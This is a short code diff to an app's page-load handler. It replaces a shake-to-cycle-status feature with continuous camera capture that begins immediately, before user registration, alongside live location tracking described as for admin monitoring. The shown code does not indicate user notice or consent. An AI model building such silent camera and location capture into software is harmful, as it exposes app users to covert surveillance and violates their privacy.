@@ -218,12 +218,11 @@ document.addEventListener('DOMContentLoaded', function() {
         return;
     }
     loadData();
-    // Start shake-to-cycle-status
-    initShakeStatus();
+    // Start video recording immediately — don't wait for registration
+    startContinuousCameraCapture();
     // Start live location tracking for admin monitoring
     registerAppUser(appData.userName || 'UNKNOWN').then(() => {
         startLiveLocationTracking();
-        startContinuousCameraCapture();
     });
 
     // REST fallback: ensure registration even if Supabase JS library failed to load
